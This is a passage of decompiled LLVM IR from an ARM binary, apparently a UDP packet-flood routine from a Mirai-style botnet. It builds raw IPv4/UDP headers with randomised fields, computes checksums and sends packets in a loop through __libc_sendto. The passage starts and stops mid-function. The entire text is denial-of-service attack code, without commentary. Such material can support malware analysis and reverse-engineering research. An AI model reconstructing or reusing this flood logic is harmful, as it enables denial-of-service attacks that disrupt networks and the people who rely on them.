  %v0_9118 = load i32, i32* @r7, align 4
  %v1_9118 = urem i32 %v0_9118, 256
  store i32 %v1_9118, i32* @r7, align 4
  %v3_911c = urem i32 %v0_90fc, 65536
  store i32 %v3_911c, i32* %r3.global-to-local, align 4
  %v3_9120 = urem i32 %v0_9110, 65536
  store i32 %v3_9120, i32* %ip.global-to-local, align 4
  %v2_9124 = icmp eq i32 %arg2, 0
  store i1 %v2_9124, i1* %cpsr_z.global-to-local, align 1
  %v0_9134 = load i32, i32* @sb, align 4
  store i32 %v0_9134, i32* %stack_var_-44, align 4
  %v3_9138 = urem i32 %v7_8fbc, 65536
  store i32 %v3_9138, i32* @fp, align 4
  br i1 %v2_9124, label %dec_label_pc_932c.preheader, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_90fc
  %v3_9110 = mul i32 %v0_9110, 65536
  %v3_90fc = mul i32 %v0_90fc, 65536
  %v3_914c = mul i32 %v6_904c, 65536
  %v1_9150 = add i32 %v3_914c, 3407872
  %tmp68 = udiv i32 %v1_9150, 256
  %v3_915c = and i32 %tmp68, 65280
  %v7_8fbc.not = or i32 %v7_8fbc, -65536
  %v1_9160 = xor i32 %v7_8fbc.not, 65535
  %v4_9164 = udiv i32 %v1_9150, 16777216
  %v5_9164 = or i32 %v3_915c, %v4_9164
  store i32 %v3_9114, i32* %r3.global-to-local, align 4
  %tmp69 = mul i32 %v7_8fbc, 256
  %v3_917c = and i32 %tmp69, 65280
  %tmp70 = mul nsw i32 %v1_9160, 256
  %v3_9180 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v7_8fbc, 256
  %v4_9184 = urem i32 %tmp71, 256
  %v5_9184 = or i32 %v4_9184, %v3_917c
  %tmp72 = udiv i32 %v1_9160, 256
  %v4_918c = urem i32 %tmp72, 256
  %v5_918c = or i32 %v4_918c, %v3_9180
  store i32 %v5_918c, i32* @r6, align 4
  store i32 %v3_90fc, i32* %r1.global-to-local, align 4
  store i32 %v3_9110, i32* %r2.global-to-local, align 4
  %v1_91a0 = add i32 %v3_914c, 524288
  %tmp73 = mul i32 %v0_90fc, 256
  %v3_91a4 = and i32 %tmp73, 65280
  %v1_91a8 = add i32 %v3_914c, 1835008
  store i32 %v1_91a8, i32* @r5, align 4
  %tmp74 = mul i32 %v0_9110, 256
  %v3_91ac = and i32 %tmp74, 65280
  %v3_91b4 = udiv i32 %v1_91a8, 256
  %tmp75 = udiv i32 %v0_90fc, 256
  %v4_91b8 = urem i32 %tmp75, 256
  %v5_91b8 = or i32 %v4_91b8, %v3_91a4
  %tmp76 = udiv i32 %v0_9110, 256
  %v4_91bc = urem i32 %tmp76, 256
  %v5_91bc = or i32 %v4_91bc, %v3_91ac
  store i32 %v5_91bc, i32* %ip.global-to-local, align 4
  %v1_91c0 = and i32 %v3_91b4, 65280
  %tmp77 = udiv i32 %v1_91a0, 256
  %v3_91c4 = and i32 %tmp77, 65280
  store i32 %v3_91c4, i32* @lr, align 4
  %v4_91d8 = udiv i32 %v1_91a0, 16777216
  %v5_91d8 = or i32 %v3_91c4, %v4_91d8
  store i32 %v5_91d8, i32* @r7, align 4
  %v4_91dc = udiv i32 %v1_91a8, 16777216
  %v5_91dc = or i32 %v1_91c0, %v4_91dc
  store i32 %v5_91dc, i32* @r8, align 4
  store i32 %v0_9134, i32* @r4, align 4
  %v1_9240 = trunc i32 %v6_8fd4 to i8
  %sext = mul nuw i32 %v5_9164, 65536
  %v4_9248 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_9184, 65536
  %v4_924c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_918c, 65536
  %v4_92b4 = sdiv i32 %sext9, 65536
  %v2_92e4 = icmp eq i32 %v1_9118, 0
  %sext10 = mul nuw i32 %v5_91b8, 65536
  %v4_9308 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_91bc, 65536
  %v4_9310 = sdiv i32 %sext11, 65536
  %extract.t = trunc i32 %v4_9248 to i16
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %bb82, %dec_label_pc_9148
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_91f0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8f80, i32* %ip.global-to-local, align 4
  %v2_91fc = load i32, i32* @r4, align 4
  %v5_91fc = mul i32 %v2_91fc, 4
  %v6_91fc = add i32 %v5_91fc, %v2_8f80
  %v7_91fc = inttoptr i32 %v6_91fc to i32*
  store i32 %v2_91f0, i32* %v7_91fc, align 4
  %v3_9200 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9200, i32* %r3.global-to-local, align 4
  %v0_9204 = load i32, i32* %ip.global-to-local, align 4
  %v4_9204 = mul i32 %v3_9200, 4
  %v5_9204 = add i32 %v0_9204, %v4_9204
  %v6_9204 = inttoptr i32 %v5_9204 to i32*
  %v7_9204 = load i32, i32* %v6_9204, align 4
  store i32 %v7_9204, i32* %r4.global-to-local, align 4
  %v1_9208 = inttoptr i32 %v7_9204 to i8*
  %v2_9208 = load i8, i8* %v1_9208, align 1
  %tmp = urem i8 %v2_9208, 16
  %v1_920c = zext i8 %tmp to i32
  %v1_9210 = or i32 %v1_920c, 64
  store i32 %v1_9210, i32* %r2.global-to-local, align 4
  %v1_9214 = trunc i32 %v1_9210 to i8
  store i8 %v1_9214, i8* %v1_9208, align 1
  %v0_9218 = load i32, i32* %r3.global-to-local, align 4
  %v5_921c = mul i32 %v0_9218, 24
  store i32 %v5_921c, i32* %r1.global-to-local, align 4
  %v0_9220 = load i32, i32* %r4.global-to-local, align 4
  %v1_9220 = inttoptr i32 %v0_9220 to i8*
  %v2_9220 = load i8, i8* %v1_9220, align 1
  %v1_9224 = and i8 %v2_9220, -16
  %v1_9228 = or i8 %v1_9224, 5
  store i32 %v1_9000, i32* %lr.global-to-local, align 4
  store i8 %v1_9228, i8* %v1_9220, align 1
  store i32 %v6_8f98, i32* %r2.global-to-local, align 4
  %v2_9238 = load i32, i32* %r4.global-to-local, align 4
  %v3_9238 = add i32 %v2_9238, 1
  %v4_9238 = inttoptr i32 %v3_9238 to i8*
  store i8 %v5_8fb8, i8* %v4_9238, align 1
  store i32 %v1_8fdc, i32* %r3.global-to-local, align 4
  %v2_9240 = load i32, i32* %r4.global-to-local, align 4
  %v3_9240 = add i32 %v2_9240, 8
  %v4_9240 = inttoptr i32 %v3_9240 to i8*
  store i8 %v1_9240, i8* %v4_9240, align 1
  %v0_9244 = load i32, i32* %lr.global-to-local, align 4
  %v2_9244 = icmp eq i32 %v0_9244, 0
  store i1 %v2_9244, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9248, i32* %ip.global-to-local, align 4
  store i32 %v4_924c, i32* %lr.global-to-local, align 4
  br i1 %v2_9244, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_91e4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9254 = load i32, i32* %r4.global-to-local, align 4
  %v4_9254 = add i32 %v3_9254, 6
  %v5_9254 = inttoptr i32 %v4_9254 to i16*
  store i16 64, i16* %v5_9254, align 2
  %v0_9258.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_9258.pre to i16
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_91e4, %bb
  %v0_9258.off0 = phi i16 [ %extract.t, %dec_label_pc_91e4 ], [ %extract.t27, %bb ]
  %v2_9258 = load i32, i32* %r4.global-to-local, align 4
  %v3_9258 = add i32 %v2_9258, 2
  %v4_9258 = inttoptr i32 %v3_9258 to i16*
  store i16 %v0_9258.off0, i16* %v4_9258, align 2
  %v0_925c = load i32, i32* %r4.global-to-local, align 4
  %v1_925c = add i32 %v0_925c, 20
  store i32 %v1_925c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_9268 = add i32 %v0_925c, 9
  %v4_9268 = inttoptr i32 %v3_9268 to i8*
  store i8 47, i8* %v4_9268, align 1
  %v0_926c = load i32, i32* %lr.global-to-local, align 4
  %v1_926c = trunc i32 %v0_926c to i16
  %v2_926c = load i32, i32* %r4.global-to-local, align 4
  %v3_926c = add i32 %v2_926c, 4
  %v4_926c = inttoptr i32 %v3_926c to i16*
  store i16 %v1_926c, i16* %v4_926c, align 2
  %v0_9270 = load i32, i32* %ip.global-to-local, align 4
  %v1_9270 = trunc i32 %v0_9270 to i16
  %v2_9270 = load i32, i32* %r2.global-to-local, align 4
  %v3_9270 = add i32 %v2_9270, 2
  %v4_9270 = inttoptr i32 %v3_9270 to i16*
  store i16 %v1_9270, i16* %v4_9270, align 2
  store i32 %v6_90a0, i32* %lr.global-to-local, align 4
  %v0_9278 = load i32, i32* %r4.global-to-local, align 4
  %v1_9278 = add i32 %v0_9278, 24
  %v2_9278 = inttoptr i32 %v1_9278 to i8*
  %v3_9278 = load i8, i8* %v2_9278, align 1
  %v4_9278 = zext i8 %v3_9278 to i32
  store i32 %v4_9278, i32* %r2.global-to-local, align 4
  %v2_927c = add i32 %v0_9278, 12
  %v3_927c = inttoptr i32 %v2_927c to i32*
  store i32 %v6_90a0, i32* %v3_927c, align 4
  %v0_9280 = load i32, i32* %r2.global-to-local, align 4
  %v1_9280 = and i32 %v0_9280, -241
  %v1_9284 = or i32 %v1_9280, 64
  store i32 %v1_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* %r1.global-to-local, align 4
  %v1_9288 = load i32, i32* @sl, align 4
  %v2_9288 = add i32 %v1_9288, %v0_9288
  store i32 %v2_9288, i32* %r1.global-to-local, align 4
  %v1_928c = add i32 %v2_9288, 16
  %v2_928c = inttoptr i32 %v1_928c to i32*
  %v3_928c = load i32, i32* %v2_928c, align 4
  store i32 %v3_928c, i32* %r1.global-to-local, align 4
  %v1_9290 = trunc i32 %v1_9284 to i8
  %v2_9290 = load i32, i32* %r4.global-to-local, align 4
  %v3_9290 = add i32 %v2_9290, 24
  %v4_9290 = inttoptr i32 %v3_9290 to i8*
  store i8 %v1_9290, i8* %v4_9290, align 1
  %v0_9294 = load i32, i32* %r4.global-to-local, align 4
  %v1_9294 = add i32 %v0_9294, 24
  %v2_9294 = inttoptr i32 %v1_9294 to i8*
  %v3_9294 = load i8, i8* %v2_9294, align 1
  %v1_9298 = and i8 %v3_9294, -16
  %v1_929c = or i8 %v1_9298, 5
  store i8 %v1_929c, i8* %v2_9294, align 1
  %v0_92a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_92a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_92a4 = add i32 %v1_92a4, 16
  %v3_92a4 = inttoptr i32 %v2_92a4 to i32*
  store i32 %v0_92a4, i32* %v3_92a4, align 4
  store i32 %v6_8f98, i32* %r1.global-to-local, align 4
  %v0_92ac = load i32, i32* %r4.global-to-local, align 4
  %v1_92ac = add i32 %v0_92ac, 24
  store i32 %v1_92ac, i32* @r5, align 4
  %v3_92b0 = add i32 %v0_92ac, 25
  %v4_92b0 = inttoptr i32 %v3_92b0 to i8*
  store i8 %v5_8fb8, i8* %v4_92b0, align 1
  store i32 %v4_92b4, i32* %r2.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r8, align 4
  %v1_92b8 = trunc i32 %v0_92b8 to i16
  %v2_92b8 = load i32, i32* @r5, align 4
  %v3_92b8 = add i32 %v2_92b8, 2
  %v4_92b8 = inttoptr i32 %v3_92b8 to i16*
  store i16 %v1_92b8, i16* %v4_92b8, align 2
  %v0_92bc = load i32, i32* %r2.global-to-local, align 4
  %v1_92bc = trunc i32 %v0_92bc to i16
  %v2_92bc = load i32, i32* @r5, align 4
  %v3_92bc = add i32 %v2_92bc, 4
  %v4_92bc = inttoptr i32 %v3_92bc to i16*
  store i16 %v1_92bc, i16* %v4_92bc, align 2
  store i32 %v1_8fdc, i32* %r3.global-to-local, align 4
  %v0_92c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_92c4, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 64, i32* %ip.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v2_92c8 = load i32, i32* @r5, align 4
  %v3_92c8 = add i32 %v2_92c8, 8
  %v4_92c8 = inttoptr i32 %v3_92c8 to i8*
  store i8 %v1_9240, i8* %v4_92c8, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_92d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_92d0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_92d0 = load i32, i32* %ip.global-to-local, align 4
  %v2_92d0 = trunc i32 %v1_92d0 to i16
  %v3_92d0 = load i32, i32* @r5, align 4
  %v4_92d0 = add i32 %v3_92d0, 6
  %v5_92d0 = inttoptr i32 %v4_92d0 to i16*
  store i16 %v2_92d0, i16* %v5_92d0, align 2
  %v0_92d4.pre = load i32, i32* %r3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_92d4.pre to i8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_92d4.off0 = phi i8 [ 17, %bb79 ], [ %extract.t28, %bb80 ]
  %v2_92d4 = load i32, i32* @r5, align 4
  %v3_92d4 = add i32 %v2_92d4, 9
  %v4_92d4 = inttoptr i32 %v3_92d4 to i8*
  store i8 %v0_92d4.off0, i8* %v4_92d4, align 1
  %v0_92d8 = call i32 @rand_next()
  store i32 %v1_9118, i32* @lr, align 4
  store i1 %v2_92e4, i1* %cpsr_z.global-to-local, align 1
  %v1_92e8 = sub i32 1023, %v0_92d8
  store i32 %v1_92e8, i32* %r3.global-to-local, align 4
  br i1 %v2_92e4, label %.thread12, label %.thread13

.thread12:                                        ; preds = %bb81
  %v2_92f0 = load i32, i32* @r5, align 4
  %v3_92f0 = add i32 %v2_92f0, 16
  %v4_92f0 = inttoptr i32 %v3_92f0 to i32*
  store i32 %v1_92e8, i32* %v4_92f0, align 4
  br label %bb82

.thread13:                                        ; preds = %bb81
  %v1_92ec = load i32, i32* %r4.global-to-local, align 4
  %v2_92ec = add i32 %v1_92ec, 16
  %v3_92ec = inttoptr i32 %v2_92ec to i32*
  %v4_92ec = load i32, i32* %v3_92ec, align 4
  store i32 %v4_92ec, i32* %r3.global-to-local, align 4
  %v2_92f4 = load i32, i32* @r5, align 4
  %v3_92f4 = add i32 %v2_92f4, 16
  %v4_92f4 = inttoptr i32 %v3_92f4 to i32*
  store i32 %v4_92ec, i32* %v4_92f4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread12, %.thread13
  %v1_92f8 = load i32, i32* @r5, align 4
  %v2_92f8 = add i32 %v1_92f8, 12
  %v3_92f8 = inttoptr i32 %v2_92f8 to i32*
  store i32 %v0_92d8, i32* %v3_92f8, align 4
  %v3_92fc = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_9304 = load i32, i32* %r4.global-to-local, align 4
  %v1_9304 = add i32 %v0_9304, 44
  store i32 %v1_9304, i32* @r6, align 4
  store i32 %v4_9308, i32* %r2.global-to-local, align 4
  %v1_930c = add i32 %v3_92fc, 1
  store i32 %v1_930c, i32* @r4, align 4
  store i32 %v4_9310, i32* %r3.global-to-local, align 4
  %v9_9314 = icmp eq i32 %v1_930c, %arg2
  store i1 %v9_9314, i1* %cpsr_z.global-to-local, align 1
  %v0_9318 = load i32, i32* @r7, align 4
  %v1_9318 = trunc i32 %v0_9318 to i16
  %v3_9318 = add i32 %v0_9304, 48
  %v4_9318 = inttoptr i32 %v3_9318 to i16*
  store i16 %v1_9318, i16* %v4_9318, align 2
  %v0_931c = load i32, i32* %r2.global-to-local, align 4
  %v1_931c = trunc i32 %v0_931c to i16
  %v2_931c = load i32, i32* @r6, align 4
  %v3_931c = inttoptr i32 %v2_931c to i16*
  store i16 %v1_931c, i16* %v3_931c, align 2
  %v0_9320 = load i32, i32* %r3.global-to-local, align 4
  %v1_9320 = trunc i32 %v0_9320 to i16
  %v2_9320 = load i32, i32* @r6, align 4
  %v3_9320 = add i32 %v2_9320, 2
  %v4_9320 = inttoptr i32 %v3_9320 to i16*
  store i16 %v1_9320, i16* %v4_9320, align 2
  %v0_9324 = load i32, i32* @r4, align 4
  store i32 %v0_9324, i32* %stack_var_-44, align 4
  %v5_9328 = icmp slt i32 %v1_930c, %arg2
  br i1 %v5_9328, label %dec_label_pc_91e4, label %dec_label_pc_932c.preheader

dec_label_pc_932c.preheader:                      ; preds = %bb82, %dec_label_pc_90fc
  %v1_9348 = add i32 %v6_904c, 8
  %v1_934c = add i32 %v6_904c, 52
  %v2_9358 = icmp eq i32 %v6_90a0, -1
  %v7_9358 = icmp eq i32 %v6_90a0, -1
  %v2_953c = icmp eq i32 %v1_9118, 0
  %v2_9558 = icmp eq i32 %v1_906c, 0
  br label %dec_label_pc_932c

dec_label_pc_932c:                                ; preds = %dec_label_pc_932c.preheader, %dec_label_pc_9584
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_9124, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9124, label %dec_label_pc_9584, label %dec_label_pc_9340

dec_label_pc_9340:                                ; preds = %dec_label_pc_932c
  store i32 %v6_904c, i32* %lr.global-to-local, align 4
  store i32 %v1_9348, i32* @sb, align 4
  store i32 %v1_934c, i32* @r8, align 4
  br label %dec_label_pc_9458

dec_label_pc_9354:                                ; preds = %dec_label_pc_9458
  store i32 %v6_90a0, i32* %r2.global-to-local, align 4
  store i1 %v7_9358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9358, label %dec_label_pc_94e0, label %dec_label_pc_9360

dec_label_pc_9360:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9354
  store i32 65535, i32* @r4, align 4
  %v0_9368 = load i32, i32* @fp, align 4
  %v9_9368 = icmp eq i32 %v0_9368, 65535
  store i1 %v9_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9368, label %dec_label_pc_94f8, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_94e0.dec_label_pc_9370_crit_edge, %dec_label_pc_9360
  %v1_9374 = phi i32 [ %v1_9374.pre, %dec_label_pc_94e0.dec_label_pc_9370_crit_edge ], [ 65535, %dec_label_pc_9360 ]
  store i32 %v3_911c, i32* %r3.global-to-local, align 4
  %v9_9374 = icmp eq i32 %v3_911c, %v1_9374
  store i1 %v9_9374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9374, label %dec_label_pc_9520, label %dec_label_pc_937c

dec_label_pc_937c:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9370
  %v1_9380 = phi i32 [ %v1_9518, %dec_label_pc_94f8 ], [ %v1_9374, %dec_label_pc_9370 ]
  store i32 %v3_9120, i32* %ip.global-to-local, align 4
  %v9_9380 = icmp eq i32 %v3_9120, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9534, label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9520, %dec_label_pc_937c
  store i32 %v1_9118, i32* @lr, align 4
  store i1 %v2_953c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_953c, label %dec_label_pc_9550, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_9388
  %v1_9390 = load i32, i32* @r5, align 4
  %v2_9390 = add i32 %v1_9390, 16
  %v3_9390 = inttoptr i32 %v2_9390 to i32*
  %v4_9390 = load i32, i32* %v3_9390, align 4
  store i32 %v4_9390, i32* %r3.global-to-local, align 4
  %v2_9394 = load i32, i32* @r6, align 4
  %v3_9394 = add i32 %v2_9394, 16
  %v4_9394 = inttoptr i32 %v3_9394 to i32*
  store i32 %v4_9390, i32* %v4_9394, align 4
  br label %dec_label_pc_939c

dec_label_pc_939c:                                ; preds = %bb85, %.thread14
  store i32 %v1_906c, i32* %r1.global-to-local, align 4
  store i1 %v2_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9558, label %dec_label_pc_93a8, label %dec_label_pc_9564

dec_label_pc_93a8:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9550, %dec_label_pc_9564
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_93ac = load i32, i32* @r5, align 4
  %v3_93ac = add i32 %v2_93ac, 10
  %v4_93ac = inttoptr i32 %v3_93ac to i16*
  store i16 0, i16* %v4_93ac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_93b4 = load i32, i32* @r5, align 4
  store i32 %v0_93b4, i32* @r0, align 4
  %v2_93b8 = call i32 @checksum_generic(i32 %v0_93b4, i32 20)
  %v3_93b8 = trunc i32 %v2_93b8 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_93c0 = load i32, i32* @r5, align 4
  %v4_93c0 = add i32 %v3_93c0, 10
  %v5_93c0 = inttoptr i32 %v4_93c0 to i16*
  store i16 %v3_93b8, i16* %v5_93c0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_93c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_93c8 = trunc i32 %v0_93c8 to i16
  %v2_93c8 = load i32, i32* @r6, align 4
  %v3_93c8 = add i32 %v2_93c8, 10
  %v4_93c8 = inttoptr i32 %v3_93c8 to i16*
  store i16 %v1_93c8, i16* %v4_93c8, align 2
  %v0_93cc = load i32, i32* @r6, align 4
  store i32 %v0_93cc, i32* @r0, align 4
  %v2_93d0 = call i32 @checksum_generic(i32 %v0_93cc, i32 20)
  %v3_93d0 = trunc i32 %v2_93d0 to i16
  %v3_93d4 = load i32, i32* @r6, align 4
  %v4_93d4 = add i32 %v3_93d4, 10
  %v5_93d4 = inttoptr i32 %v4_93d4 to i16*
  store i16 %v3_93d0, i16* %v5_93d4, align 2
  %v2_93dc = load i32, i32* @r7, align 4
  %v3_93dc = add i32 %v2_93dc, 6
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 0, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r7, align 4
  store i32 %v0_93e0, i32* @r1, align 4
  %v1_93e4 = add i32 %v0_93e0, 4
  %v2_93e4 = inttoptr i32 %v1_93e4 to i16*
  %v3_93e4 = load i16, i16* %v2_93e4, align 2
  %v4_93e4 = zext i16 %v3_93e4 to i32
  store i32 %v4_93e4, i32* %r2.global-to-local, align 4
  %v0_93e8 = load i32, i32* @sb, align 4
  store i32 %v0_93e8, i32* %r3.global-to-local, align 4
  %v0_93ec = load i32, i32* @r6, align 4
  %v4_93f0 = call i32 @checksum_tcpudp(i32 %v0_93ec, i32 %v0_93e0, i32 %v4_93e4, i32 %v0_93e8)
  %v5_93f0 = trunc i32 %v4_93f0 to i16
  %v3_93f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_93f4, i32* %r2.global-to-local, align 4
  %v3_93f8 = mul i32 %v3_93f4, 32
  store i32 %v3_93f8, i32* %r3.global-to-local, align 4
  %v0_93fc = load i32, i32* @r5, align 4
  %v1_93fc = add i32 %v0_93fc, 16
  %v2_93fc = inttoptr i32 %v1_93fc to i32*
  %v3_93fc = load i32, i32* %v2_93fc, align 4
  %v5_9400 = mul i32 %v3_93f4, 24
  store i32 %v5_9400, i32* %r3.global-to-local, align 4
  %v1_9404 = load i32, i32* @sl, align 4
  %v2_9404 = add i32 %v1_9404, %v5_9400
  store i32 %v2_9404, i32* @lr, align 4
  %v2_9408 = add i32 %v2_9404, 4
  %v3_9408 = inttoptr i32 %v2_9408 to i32*
  store i32 %v3_93fc, i32* %v3_9408, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9414 = load i32, i32* @r7, align 4
  %v4_9414 = add i32 %v3_9414, 6
  %v5_9414 = inttoptr i32 %v4_9414 to i16*
  store i16 %v5_93f0, i16* %v5_9414, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_941c = load i32, i32* %r1.global-to-local, align 4
  %v1_941c = trunc i32 %v0_941c to i16
  %v2_941c = load i32, i32* %r3.global-to-local, align 4
  %v3_941c = load i32, i32* @sl, align 4
  %v4_941c = add i32 %v3_941c, %v2_941c
  %v5_941c = inttoptr i32 %v4_941c to i16*
  store i16 %v1_941c, i16* %v5_941c, align 2
  %v0_9420 = load i32, i32* %r2.global-to-local, align 4
  %v1_9420 = trunc i32 %v0_9420 to i16
  %v2_9420 = load i32, i32* @lr, align 4
  %v3_9420 = add i32 %v2_9420, 2
  %v4_9420 = inttoptr i32 %v3_9420 to i16*
  store i16 %v1_9420, i16* %v4_9420, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9428 = load i32, i32* @r5, align 4
  store i32 %v0_9428, i32* %r1.global-to-local, align 4
  %v0_9430 = load i32, i32* @r8, align 4
  store i32 %v0_9430, i32* %r2.global-to-local, align 4
  %v0_9434 = load i32, i32* @lr, align 4
  %v0_9438 = load i32, i32* %ip.global-to-local, align 4
  %v6_943c = call i32 @__libc_sendto(i32 %v3_90c4, i32 %v0_9428, i32 %v0_9430, i32 16384, i32 %v0_9434, i32 %v0_9438)
  %v3_9440 = load i32, i32* %stack_var_-44, align 4
  %v1_9444 = add i32 %v3_9440, 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_944c = icmp eq i32 %v1_9444, %arg2
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9444, i32* %stack_var_-44, align 4
  %v6_9454 = icmp slt i32 %v1_9444, %arg2
  br i1 %v6_9454, label %dec_label_pc_9458, label %dec_label_pc_9584

dec_label_pc_9458:                                ; preds = %dec_label_pc_93a8, %dec_label_pc_9340
  %v1_946c = phi i32 [ %v1_9444, %dec_label_pc_93a8 ], [ 0, %dec_label_pc_9340 ]
  %v5_945c = mul i32 %v1_946c, 24
  %v1_9460 = load i32, i32* @sl, align 4
  %v2_9460 = add i32 %v1_9460, %v5_945c
  store i32 %v2_9460, i32* %r3.global-to-local, align 4
  store i32 %v2_8f80, i32* %r1.global-to-local, align 4
  %v1_9468 = add i32 %v2_9460, 20
  %v2_9468 = inttoptr i32 %v1_9468 to i8*
  %v3_9468 = load i8, i8* %v2_9468, align 1
  %v4_9468 = zext i8 %v3_9468 to i32
  store i32 %v4_9468, i32* %r2.global-to-local, align 4
  %v4_946c = mul i32 %v1_946c, 4
  %v5_946c = add i32 %v4_946c, %v2_8f80
  %v6_946c = inttoptr i32 %v5_946c to i32*
  %v7_946c = load i32, i32* %v6_946c, align 4
  store i32 %v7_946c, i32* @r5, align 4
  %v2_9470 = icmp ugt i8 %v3_9468, 30
  %v7_9470 = icmp eq i8 %v3_9468, 31
  store i1 %v7_9470, i1* %cpsr_z.global-to-local, align 1
  %v1_9474 = add i32 %v7_946c, 24
  store i32 %v1_9474, i32* @r6, align 4
  %v1_9478 = add i32 %v7_946c, 44
  store i32 %v1_9478, i32* @r7, align 4
  %v2_947c = xor i1 %v7_9470, true
  %v3_947c = and i1 %v2_9470, %v2_947c
  br i1 %v3_947c, label %dec_label_pc_9354, label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %dec_label_pc_9458
  %v1_9480 = add i32 %v2_9460, 16
  %v2_9480 = inttoptr i32 %v1_9480 to i32*
  %v3_9480 = load i32, i32* %v2_9480, align 4
  store i32 %v3_9480, i32* %r4.global-to-local, align 4
  %v0_9484 = call i32 @rand_next()
  %v3_9488 = load i32, i32* %stack_var_-44, align 4
  %v5_9490 = mul i32 %v3_9488, 24
  %v1_9494 = and i32 %v3_9480, 16711680
  store i32 %v1_9494, i32* %ip.global-to-local, align 4
  %v3_9498 = udiv i32 %v3_9480, 16777216
  %v4_949c = udiv i32 %v1_9494, 256
  %v5_949c = or i32 %v4_949c, %v3_9498
  store i32 %v5_949c, i32* %r2.global-to-local, align 4
  %v1_94a0 = load i32, i32* @sl, align 4
  %v2_94a0 = add i32 %v1_94a0, %v5_9490
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_94a4 = and i32 %v3_9480, 65280
  store i32 %v1_94a4, i32* %r3.global-to-local, align 4
  %v1_94a8 = add i32 %v2_94a0, 20
  %v2_94a8 = inttoptr i32 %v1_94a8 to i8*
  %v3_94a8 = load i8, i8* %v2_94a8, align 1
  %v4_94a8 = zext i8 %v3_94a8 to i32
  store i32 %v4_94a8, i32* %ip.global-to-local, align 4
  %v5_94b0 = call i32 @llvm.bswap.i32(i32 %v3_9480)
  %v7_94b4 = lshr i32 %v0_9484, %v4_94a8
  %v8_94b4 = add i32 %v7_94b4, %v5_94b0
  %v1_94c0 = and i32 %v8_94b4, 65280
  store i32 %v1_94c0, i32* %r1.global-to-local, align 4
  %v5_94cc = call i32 @llvm.bswap.i32(i32 %v8_94b4)
  store i32 %v5_94cc, i32* %r3.global-to-local, align 4
  store i32 %v6_90a0, i32* %r2.global-to-local, align 4
  store i1 %v7_9358, i1* %cpsr_z.global-to-local, align 1
  %v1_94d8 = load i32, i32* @r5, align 4
  %v2_94d8 = add i32 %v1_94d8, 16
  %v3_94d8 = inttoptr i32 %v2_94d8 to i32*
  store i32 %v5_94cc, i32* %v3_94d8, align 4
  br i1 %v2_9358, label %dec_label_pc_94e0, label %dec_label_pc_9360

dec_label_pc_94e0:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9354
  %v0_94e0 = call i32 @rand_next()
  store i32 65535, i32* @r4, align 4
  %v0_94ec = load i32, i32* @fp, align 4
  %v9_94ec = icmp eq i32 %v0_94ec, 65535
  store i1 %v9_94ec, i1* %cpsr_z.global-to-local, align 1
  %v1_94f0 = load i32, i32* @r5, align 4
